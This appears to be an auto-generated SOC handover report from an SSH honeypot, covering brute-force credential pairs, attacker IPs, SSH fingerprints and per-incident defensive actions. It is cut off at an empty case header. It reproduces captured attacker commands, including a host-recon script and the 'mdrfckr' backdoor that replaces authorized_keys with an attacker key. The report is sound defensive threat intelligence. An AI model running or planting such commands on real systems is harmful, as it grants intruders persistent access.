# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-07-23 |
| **Generated At** | 2026-07-23T21:08:47Z |
| **Shift Time** | 21:08 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · Oracle Cloud HA · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **216** |
| Confirmed Threats | **195** |
| False Positives Filtered | **21** (9.7%) |
| Unique Attacker IPs | **94** |
| Countries of Origin | **23** |
| High Severity Cases | **151** |
| Medium Severity Cases | **0** |
| Low Severity Cases | **65** |
| Malware Samples Analyzed | **3** HIGH · **31** MED · 12 empty upload attempt(s) |

---

## 🔑 Credential Intelligence

| Metric | Value |
|---|---|
| Total Auth Attempts | **182** |
| Unique Credential Pairs | **119** |
| Unique Usernames | **71** |
| Unique Passwords | **93** |
| Successful Auth Pairs | **166** |

**Top Usernames:**

| Username | Attempts |
|---|---|
| `root` | 34 |
| `mysql` | 14 |
| `guest` | 8 |
| `user` | 7 |
| `operator` | 7 |

**Top Passwords:**

| Password | Attempts |
|---|---|
| `44` | 7 |
| `123456` | 7 |
| `unknown2024` | 6 |
| `111111` | 6 |
| `123321` | 5 |

**Top Credential Pairs:**

| Username | Password | Attempts |
|---|---|---|
| `unknown` | `unknown2024` | 6 |
| `mysql` | `123321` | 5 |
| `root` | `root2000` | 5 |
| `root` | `00000` | 5 |
| `config` | `33333` | 4 |

**⚠️ Successful Auth Pairs (Priority — cross-reference with IR cases):**

| Username | Password | Source IP | Timestamp |
|---|---|---|---|
| `centos` | `8888888` | `10.0.0.73` | 2026-07-23T19:00:28 |
| `unknown` | `unknown2024` | `182.60.128.241` | 2026-07-23T19:09:46 |
| `unknown` | `unknown2024` | `223.82.86.2` | 2026-07-23T19:10:00 |
| `unknown` | `unknown2024` | `186.215.107.189` | 2026-07-23T19:12:59 |
| `config` | `33333` | `45.178.227.0` | 2026-07-23T19:13:09 |
| `unknown` | `unknown2024` | `111.70.10.15` | 2026-07-23T19:13:12 |
| `mysql` | `123321` | `62.122.195.14` | 2026-07-23T19:13:14 |
| `unknown` | `unknown2024` | `10.0.0.73` | 2026-07-23T19:13:26 |
| `joshua` | `joshua123` | `122.175.18.235` | 2026-07-23T19:16:06 |
| `345gs5662d34` | `345gs5662d34` | `122.175.18.235` | 2026-07-23T19:16:11 |
| `joshua` | `3245gs5662d34` | `122.175.18.235` | 2026-07-23T19:16:13 |
| `mysql` | `123321` | `24.104.225.201` | 2026-07-23T19:16:39 |
| `config` | `33333` | `1.212.225.99` | 2026-07-23T19:16:40 |
| `mysql` | `123321` | `220.163.252.244` | 2026-07-23T19:16:48 |
| `config` | `33333` | `10.0.0.73` | 2026-07-23T19:16:57 |
| `mysql` | `123321` | `10.0.0.73` | 2026-07-23T19:16:58 |
| `report` | `report` | `181.47.9.103` | 2026-07-23T19:19:59 |
| `345gs5662d34` | `345gs5662d34` | `181.47.9.103` | 2026-07-23T19:20:02 |
| `report` | `3245gs5662d34` | `181.47.9.103` | 2026-07-23T19:20:03 |
| `guest` | `111111` | `103.251.143.14` | 2026-07-23T19:21:06 |
| `root` | `LeitboGi0ro` | `144.22.238.238` | 2026-07-23T19:22:30 |
| `root` | `123@@@` | `144.22.238.238` | 2026-07-23T19:22:30 |
| `root` | `smo@@kkklss` | `144.22.238.238` | 2026-07-23T19:22:39 |
| `support` | `support` | `176.53.159.196` | 2026-07-23T19:22:52 |
| `support` | `support` | `10.0.0.73` | 2026-07-23T19:24:09 |
| `guest` | `111111` | `14.153.235.75` | 2026-07-23T19:24:11 |
| `guest` | `111111` | `125.139.124.120` | 2026-07-23T19:24:20 |
| `guest` | `111111` | `10.0.0.73` | 2026-07-23T19:24:35 |
| `root` | `root2000` | `122.187.230.38` | 2026-07-23T19:32:55 |
| `root` | `root2000` | `111.70.32.10` | 2026-07-23T19:33:04 |
| `root` | `root2000` | `59.93.36.136` | 2026-07-23T19:36:10 |
| `root` | `root2000` | `10.0.0.73` | 2026-07-23T19:36:30 |
| `root` | `123@@@` | `129.153.145.135` | 2026-07-23T19:37:14 |
| `root` | `LeitboGi0ro` | `129.153.145.135` | 2026-07-23T19:37:15 |
| `user` | `44` | `31.173.66.222` | 2026-07-23T19:37:38 |
| `user` | `44` | `24.97.253.246` | 2026-07-23T19:37:50 |
| `user` | `44` | `59.11.246.91` | 2026-07-23T19:41:02 |
| `user` | `44` | `223.25.108.2` | 2026-07-23T19:41:10 |
| `root` | `pDR2yqAq1w` | `10.0.0.73` | 2026-07-23T19:41:14 |
| `blank` | `11` | `10.0.0.73` | 2026-07-23T19:41:20 |
| `mysql` | `letmein` | `183.233.85.194` | 2026-07-23T19:45:25 |
| `mysql` | `letmein` | `10.0.0.73` | 2026-07-23T19:49:03 |
| `operator` | `operator2018` | `188.219.104.210` | 2026-07-23T19:56:04 |
| `operator` | `operator2018` | `187.115.144.103` | 2026-07-23T19:56:14 |
| `operator` | `operator2018` | `210.204.137.38` | 2026-07-23T19:59:20 |
| `debian` | `4444444` | `190.57.233.133` | 2026-07-23T20:01:50 |
| `operator` | `operator99` | `62.182.132.94` | 2026-07-23T20:01:51 |
| `debian` | `4444444` | `207.219.221.101` | 2026-07-23T20:01:57 |
| `operator` | `operator99` | `116.113.241.82` | 2026-07-23T20:02:00 |
| `operator` | `operator99` | `111.70.32.8` | 2026-07-23T20:05:01 |
| `operator` | `operator99` | `60.171.135.254` | 2026-07-23T20:05:10 |
| `root` | `﻿------fuck------` | `10.0.0.73` | 2026-07-23T20:06:06 |
| `ubnt` | `0` | `58.34.174.90` | 2026-07-23T20:09:44 |
| `ubnt` | `0` | `178.178.222.59` | 2026-07-23T20:09:51 |
| `root` | `111111` | `80.94.92.234` | 2026-07-23T20:10:34 |
| `ubnt` | `0` | `118.26.153.102` | 2026-07-23T20:13:00 |
| `root` | `123123` | `80.94.92.234` | 2026-07-23T20:16:24 |
| `admin` | `admin` | `195.178.110.137` | 2026-07-23T20:17:45 |
| `guest` | `Password` | `220.178.39.106` | 2026-07-23T20:19:17 |
| `guest` | `Password` | `103.67.152.201` | 2026-07-23T20:22:12 |
| `guest` | `Password` | `10.0.0.73` | 2026-07-23T20:22:37 |
| `admin` | `admin` | `10.0.0.73` | 2026-07-23T20:24:46 |
| `administrator` | `1q2w3e` | `124.133.10.66` | 2026-07-23T20:25:55 |
| `administrator` | `1q2w3e` | `118.122.196.230` | 2026-07-23T20:26:08 |
| `administrator` | `1q2w3e` | `182.76.36.62` | 2026-07-23T20:29:19 |
| `mysql` | `qwerty123456` | `49.124.151.64` | 2026-07-23T20:29:34 |
| `mysql` | `qwerty123456` | `14.97.77.182` | 2026-07-23T20:29:42 |
| `mysql` | `qwerty123456` | `10.0.0.73` | 2026-07-23T20:30:00 |
| `centos` | `44` | `186.103.136.43` | 2026-07-23T20:33:57 |
| `centos` | `44` | `60.175.91.53` | 2026-07-23T20:37:24 |
| `centos` | `44` | `10.0.0.73` | 2026-07-23T20:37:50 |
| `debian` | `debian2011` | `107.135.117.245` | 2026-07-23T20:45:12 |
| `debian` | `debian2011` | `213.33.204.130` | 2026-07-23T20:45:19 |
| `debian` | `debian2011` | `10.0.0.73` | 2026-07-23T20:45:35 |
| `root` | `Admin123!` | `77.239.124.246` | 2026-07-23T20:47:16 |
| `mc` | `mc` | `77.239.124.246` | 2026-07-23T20:47:22 |
| `dev` | `123456` | `77.239.124.246` | 2026-07-23T20:47:27 |
| `osmc` | `osmc` | `77.239.124.246` | 2026-07-23T20:47:33 |
| `test` | `test123` | `77.239.124.246` | 2026-07-23T20:47:38 |
| `root` | `pass` | `77.239.124.246` | 2026-07-23T20:47:44 |
| `user` | `rootroot` | `77.239.124.246` | 2026-07-23T20:47:49 |
| `dev` | `password` | `77.239.124.246` | 2026-07-23T20:47:55 |
| `debian` | `qwerty` | `77.239.124.246` | 2026-07-23T20:48:00 |
| `root` | `11` | `77.239.124.246` | 2026-07-23T20:48:06 |
| `appuser` | `123456` | `77.239.124.246` | 2026-07-23T20:48:12 |
| `rocky` | `rocky` | `77.239.124.246` | 2026-07-23T20:48:17 |
| `ftpuser` | `ftpuser` | `77.239.124.246` | 2026-07-23T20:48:23 |
| `lighthouse` | `lighthouse` | `77.239.124.246` | 2026-07-23T20:48:28 |
| `pi` | `1` | `77.239.124.246` | 2026-07-23T20:48:34 |
| `mysql` | `mysql123` | `77.239.124.246` | 2026-07-23T20:48:39 |
| `fivem` | `fivem` | `77.239.124.246` | 2026-07-23T20:48:45 |
| `claude` | `1234` | `77.239.124.246` | 2026-07-23T20:48:50 |
| `erp` | `erp` | `77.239.124.246` | 2026-07-23T20:48:56 |
| `admin123` | `admin123` | `77.239.124.246` | 2026-07-23T20:49:01 |
| `lucas` | `lucas` | `77.239.124.246` | 2026-07-23T20:49:07 |
| `odoo17` | `odoo17` | `77.239.124.246` | 2026-07-23T20:49:12 |
| `omm` | `omm` | `77.239.124.246` | 2026-07-23T20:49:18 |
| `admin1` | `123456` | `77.239.124.246` | 2026-07-23T20:49:24 |
| `fastuser` | `123456789` | `77.239.124.246` | 2026-07-23T20:49:29 |
| `pi` | `raspberry` | `77.239.124.246` | 2026-07-23T20:49:35 |
| `x` | `1` | `77.239.124.246` | 2026-07-23T20:49:41 |
| `minecraft` | `1` | `77.239.124.246` | 2026-07-23T20:49:46 |
| `vncuser` | `password` | `77.239.124.246` | 2026-07-23T20:49:52 |
| `jakob` | `jakob` | `77.239.124.246` | 2026-07-23T20:49:58 |
| `crafty` | `1234` | `77.239.124.246` | 2026-07-23T20:50:03 |
| `potok` | `potok` | `77.239.124.246` | 2026-07-23T20:50:09 |
| `oracle` | `asdfgh` | `116.48.151.136` | 2026-07-23T20:50:11 |
| `cloud` | `1` | `77.239.124.246` | 2026-07-23T20:50:15 |
| `dev` | `dev` | `77.239.124.246` | 2026-07-23T20:50:21 |
| `oracle` | `asdfgh` | `118.163.145.175` | 2026-07-23T20:50:25 |
| `root` | `qQ123456` | `77.239.124.246` | 2026-07-23T20:50:26 |
| `administrator` | `12345678` | `77.239.124.246` | 2026-07-23T20:50:32 |
| `root` | `00000` | `111.70.23.253` | 2026-07-23T20:50:37 |
| `kafka` | `kafka` | `77.239.124.246` | 2026-07-23T20:50:38 |
| `webuser` | `123456` | `77.239.124.246` | 2026-07-23T20:50:43 |
| `root` | `00000` | `95.35.29.192` | 2026-07-23T20:50:47 |
| `root` | `12345` | `77.239.124.246` | 2026-07-23T20:50:49 |
| `admin` | `1qaz@WSX` | `77.239.124.246` | 2026-07-23T20:50:54 |
| `runner` | `runner` | `77.239.124.246` | 2026-07-23T20:50:59 |
| `root` | `741852963` | `77.239.124.246` | 2026-07-23T20:51:05 |
| `dmdba` | `dmdba123456` | `77.239.124.246` | 2026-07-23T20:51:10 |
| `installer` | `12345` | `77.239.124.246` | 2026-07-23T20:51:16 |
| `tester` | `tester` | `77.239.124.246` | 2026-07-23T20:51:21 |
| `root` | `0987654321` | `77.239.124.246` | 2026-07-23T20:51:27 |
| `server` | `server` | `77.239.124.246` | 2026-07-23T20:51:32 |
| `tester` | `password` | `77.239.124.246` | 2026-07-23T20:51:37 |
| `nutanix` | `nutanix/4u` | `77.239.124.246` | 2026-07-23T20:51:42 |
| `user1` | `user1` | `77.239.124.246` | 2026-07-23T20:51:48 |
| `admin` | `password` | `77.239.124.246` | 2026-07-23T20:51:54 |
| `dolphinscheduler` | `dolphinscheduler` | `77.239.124.246` | 2026-07-23T20:52:00 |
| `azureuser` | `12345` | `77.239.124.246` | 2026-07-23T20:52:05 |
| `user` | `123456` | `77.239.124.246` | 2026-07-23T20:52:11 |
| `redhat` | `redhat` | `77.239.124.246` | 2026-07-23T20:52:16 |
| `david` | `david` | `77.239.124.246` | 2026-07-23T20:52:22 |
| `zimbra` | `zimbra` | `77.239.124.246` | 2026-07-23T20:52:27 |
| `chris` | `chris` | `77.239.124.246` | 2026-07-23T20:52:33 |
| `root` | `qwerty123` | `77.239.124.246` | 2026-07-23T20:52:38 |
| `sam` | `123456789` | `77.239.124.246` | 2026-07-23T20:52:44 |
| `root` | `1Q2w3e4r` | `77.239.124.246` | 2026-07-23T20:52:49 |
| `aaa` | `123456` | `77.239.124.246` | 2026-07-23T20:52:55 |
| `admin` | `admin1234` | `77.239.124.246` | 2026-07-23T20:53:00 |
| `appuser` | `12345` | `77.239.124.246` | 2026-07-23T20:53:05 |
| `dspace` | `dspace` | `77.239.124.246` | 2026-07-23T20:53:11 |
| `test` | `abc123` | `77.239.124.246` | 2026-07-23T20:53:16 |
| `root` | `!qaz@WSX` | `77.239.124.246` | 2026-07-23T20:53:21 |
| `root` | `aa123456` | `77.239.124.246` | 2026-07-23T20:53:27 |
| `root` | `linux` | `77.239.124.246` | 2026-07-23T20:53:32 |
| `system` | `system` | `77.239.124.246` | 2026-07-23T20:53:37 |
| `hduser` | `hduser` | `77.239.124.246` | 2026-07-23T20:53:42 |
| `oracle` | `asdfgh` | `10.0.0.73` | 2026-07-23T20:53:43 |
| `deploy` | `deploy123` | `77.239.124.246` | 2026-07-23T20:53:47 |
| `ansible` | `qwerty` | `77.239.124.246` | 2026-07-23T20:53:52 |
| `root` | `00000` | `203.252.10.3` | 2026-07-23T20:53:55 |
| `root` | `12345678` | `77.239.124.246` | 2026-07-23T20:53:57 |
| `alex` | `1234` | `77.239.124.246` | 2026-07-23T20:54:02 |
| `root` | `00000` | `10.0.0.73` | 2026-07-23T20:54:07 |
| `mysql` | `mysql@1234` | `77.239.124.246` | 2026-07-23T20:54:08 |
| `root` | `Qwerty123` | `77.239.124.246` | 2026-07-23T20:54:14 |
| `ubuntu` | `ubuntu` | `77.239.124.246` | 2026-07-23T20:54:19 |
| `user` | `12345` | `77.239.124.246` | 2026-07-23T20:54:25 |
| `kevin` | `kevin` | `77.239.124.246` | 2026-07-23T20:54:31 |
| `lin` | `123456` | `77.239.124.246` | 2026-07-23T20:54:37 |
| `agent` | `agent` | `77.239.124.246` | 2026-07-23T20:54:43 |
| `bob` | `root` | `77.239.124.246` | 2026-07-23T20:54:48 |
| `admin` | `admin!@` | `77.239.124.246` | 2026-07-23T20:54:54 |
| `dev` | `111111` | `77.239.124.246` | 2026-07-23T20:54:59 |

---

## 🖥 SSH Fingerprint Intelligence

| Metric | Value |
|---|---|
| Total Sessions Parsed | **216** |
| Sessions with Fingerprint | **13** |
| Unique HASSH Fingerprints | **13** |

**Client Family Distribution:**

| Client Family | Sessions |
|---|---|
| Go SSH scanner | 93 |
| OpenSSH | 50 |
| libssh | 18 |
| Paramiko (Python) | 6 |
| Perl Net::SSH | 2 |

**⚠️ Botnet/Scanner KEX Signatures Detected:**

| HASSH | Signature | Sessions | IPs |
|---|---|---|---|
| `0a07365cc01f...` | Generic scanner | 85 | 1 |
| `acaa53e0a7d7...` | Mirai/variant | 49 | 49 |
| `f555226df196...` | Mirai/variant | 6 | 2 |
| `a2de0f306611...` | Mirai/variant | 6 | 2 |
| `2ec37a7cc8da...` | Mirai/variant | 3 | 1 |

**Top Fingerprints:**

| HASSH | Client | Sessions | IPs | Botnet Sig |
|---|---|---|---|---|
| `0a07365cc01f...` | Go SSH scanner | 85 | 1 | Generic scanner |
| `acaa53e0a7d7...` | OpenSSH | 49 | 49 | Mirai/variant |
| `95420f9d932d...` | libssh | 11 | 6 | — |
| `f555226df196...` | libssh | 6 | 2 | Mirai/variant |
| `a2de0f306611...` | Paramiko (Python) | 6 | 2 | Mirai/variant |
| `2ec37a7cc8da...` | Go SSH scanner | 3 | 1 | Mirai/variant |
| `eff4c24daffc...` | Go SSH scanner | 2 | 1 | Modern SSH client |
| `3c0eaacec19b...` | Perl Net::SSH | 2 | 2 | Mirai/variant |

---

## ⚔️ Attack Campaign Intelligence

| Metric | Value |
|---|---|
| Total Command Clusters | **3** |
| Campaign Clusters | **2** |
| Highest Severity | **HIGH** |

**Active Campaigns:**

| Campaign | Severity | Sessions | IPs | TTPs |
|---|---|---|---|---|
| **Recon Loader Script** | 🟡 MEDIUM | 2 | 1 | `T1082, T1592, T1078, T1083` |
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 2 | 2 | `T1021.004, T1078, T1070, T1140` |

**🟡 MEDIUM · Recon Loader Script**

> Multi-stage recon script. Exports PATH, fingerprints host, returns data to C2 loader.

Representative commands:
```
export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una
```
```
uname -s -v -n -m 2 > /dev/null
```
```
/bin/uname -s -v -n -m 2 > /dev/null
```
```
/usr/bin/uname -s -v -n -m 2 > /dev/null
```
```
busybox uname -s -v -n -m 2 > /dev/null
```
Source IPs: `80.94.92.234`

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
Source IPs: `181.47.9.103`, `122.175.18.235`

---

## 🌐 ASN Cluster Intelligence

| Metric | Value |
|---|---|
| Total IPs Analysed | **94** |
| Unique ASNs | **56** |
| High-Risk ASNs | **50** |
| Anon Infrastructure ASNs | **0** |

**Top Attack ASNs:**

| ASN | Provider | IPs | Risk |
|---|---|---|---|
| `AS22773` | Cox Communications Inc. | 7 | MEDIUM |
| `AS46562` | Performive LLC | 6 | MEDIUM |
| `AS4134` | CHINANET BACKBONE | 6 | HIGH |
| `AS213412` | ONYPHE SAS | 5 | HIGH |
| `AS17421` | Mobile Business Group | 4 | HIGH |
| `AS4766` | Korea Telecom | 4 | HIGH |
| `AS63949` | Akamai Connected Cloud | 3 | HIGH |
| `AS4818` | DiGi Telecommunications Sdn. Bhd. | 2 | HIGH |

---

---

## 🚨 Priority Cases — Immediate Attention (151)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

### 🔴 HIGH · IR-9f346614880b

| Field | Detail |
|---|---|
| **Source IP** | `182.60.128[.]241` |
| **First Seen** | 2026-07-23 19:09 |
| **Last Seen** | 2026-07-23 19:09 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-23 19:09:42` | `cowrie.session.connect` |
| `2026-07-23 19:09:43` | `cowrie.client.version` |
| `2026-07-23 19:09:43` | `cowrie.client.kex` |
| `2026-07-23 19:09:46` | `cowrie.login.success` |
| `2026-07-23 19:09:46` | `cowrie.direct-tcpip.request` |
| `2026-07-23 19:09:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `182.60.128[.]241` to AbuseIPDB if not already reported
- [ ] Block `182.60.128[.]241` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-148c5ce64f4f

| Field | Detail |
|---|---|
| **Source IP** | `223.82.86[.]2` |
| **First Seen** | 2026-07-23 19:09 |
| **Last Seen** | 2026-07-23 19:10 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-23 19:09:57` | `cowrie.session.connect` |
| `2026-07-23 19:09:58` | `cowrie.client.version` |
| `2026-07-23 19:09:58` | `cowrie.client.kex` |
| `2026-07-23 19:10:00` | `cowrie.login.success` |
| `2026-07-23 19:10:01` | `cowrie.direct-tcpip.request` |
| `2026-07-23 19:10:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `223.82.86[.]2` to AbuseIPDB if not already reported
- [ ] Block `223.82.86[.]2` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c78babc6bfc8

| Field | Detail |
|---|---|
| **Source IP** | `186.215.107[.]189` |
| **First Seen** | 2026-07-23 19:12 |
| **Last Seen** | 2026-07-23 19:13 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-23 19:12:56` | `cowrie.session.connect` |
| `2026-07-23 19:12:57` | `cowrie.client.version` |
| `2026-07-23 19:12:57` | `cowrie.client.kex` |
| `2026-07-23 19:12:59` | `cowrie.login.success` |
| `2026-07-23 19:12:59` | `cowrie.direct-tcpip.request` |
| `2026-07-23 19:13:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `186.215.107[.]189` to AbuseIPDB if not already reported
- [ ] Block `186.215.107[.]189` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8268d809d923

| Field | Detail |
|---|---|
| **Source IP** | `45.178.227[.]0` |
| **First Seen** | 2026-07-23 19:13 |
| **Last Seen** | 2026-07-23 19:13 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-23 19:13:08` | `cowrie.session.connect` |
| `2026-07-23 19:13:08` | `cowrie.client.version` |
| `2026-07-23 19:13:08` | `cowrie.client.kex` |
| `2026-07-23 19:13:09` | `cowrie.login.success` |
| `2026-07-23 19:13:09` | `cowrie.direct-tcpip.request` |
| `2026-07-23 19:13:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.178.227[.]0` to AbuseIPDB if not already reported
- [ ] Block `45.178.227[.]0` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5dc7c31ba937

| Field | Detail |
|---|---|
| **Source IP** | `111.70.10[.]15` |
| **First Seen** | 2026-07-23 19:13 |
| **Last Seen** | 2026-07-23 19:13 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-23 19:13:09` | `cowrie.session.connect` |
| `2026-07-23 19:13:10` | `cowrie.client.version` |
| `2026-07-23 19:13:10` | `cowrie.client.kex` |
| `2026-07-23 19:13:12` | `cowrie.login.success` |
| `2026-07-23 19:13:13` | `cowrie.direct-tcpip.request` |
| `2026-07-23 19:13:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `111.70.10[.]15` to AbuseIPDB if not already reported
- [ ] Block `111.70.10[.]15` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9be0c8bdd91e

| Field | Detail |
|---|---|
| **Source IP** | `62.122.195[.]14` |
| **First Seen** | 2026-07-23 19:13 |
| **Last Seen** | 2026-07-23 19:13 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-23 19:13:13` | `cowrie.session.connect` |
| `2026-07-23 19:13:13` | `cowrie.client.version` |
| `2026-07-23 19:13:13` | `cowrie.client.kex` |
| `2026-07-23 19:13:14` | `cowrie.login.success` |
| `2026-07-23 19:13:15` | `cowrie.direct-tcpip.request` |
| `2026-07-23 19:13:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `62.122.195[.]14` to AbuseIPDB if not already reported
- [ ] Block `62.122.195[.]14` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-eb9f4ef692b6

| Field | Detail |
|---|---|
| **Source IP** | `122.175.18[.]235` |
| **First Seen** | 2026-07-23 19:16 |
| **Last Seen** | 2026-07-23 19:16 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-23 19:16:04` | `cowrie.session.connect` |
| `2026-07-23 19:16:04` | `cowrie.client.version` |
| `2026-07-23 19:16:05` | `cowrie.client.kex` |
| `2026-07-23 19:16:06` | `cowrie.login.success` |
| `2026-07-23 19:16:07` | `cowrie.session.params` |
| `2026-07-23 19:16:07` | `cowrie.command.input` |
| `2026-07-23 19:16:07` | `cowrie.command.failed` |
| `2026-07-23 19:16:08` | `cowrie.log.closed` |
| `2026-07-23 19:16:09` | `cowrie.session.params` |
| `2026-07-23 19:16:09` | `cowrie.command.input` |
| `2026-07-23 19:16:09` | `cowrie.session.file_download` |
| `2026-07-23 19:16:09` | `cowrie.log.closed` |
| `2026-07-23 19:16:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `122.175.18[.]235` to AbuseIPDB if not already reported
- [ ] Block `122.175.18[.]235` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cc4ad0d477f6

| Field | Detail |
|---|---|
| **Source IP** | `122.175.18[.]235` |
| **First Seen** | 2026-07-23 19:16 |
| **Last Seen** | 2026-07-23 19:16 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-23 19:16:10` | `cowrie.session.connect` |
| `2026-07-23 19:16:10` | `cowrie.client.version` |
| `2026-07-23 19:16:10` | `cowrie.client.kex` |
| `2026-07-23 19:16:11` | `cowrie.login.success` |
| `2026-07-23 19:16:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `122.175.18[.]235` to AbuseIPDB if not already reported
- [ ] Block `122.175.18[.]235` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8e8ad074b4ea

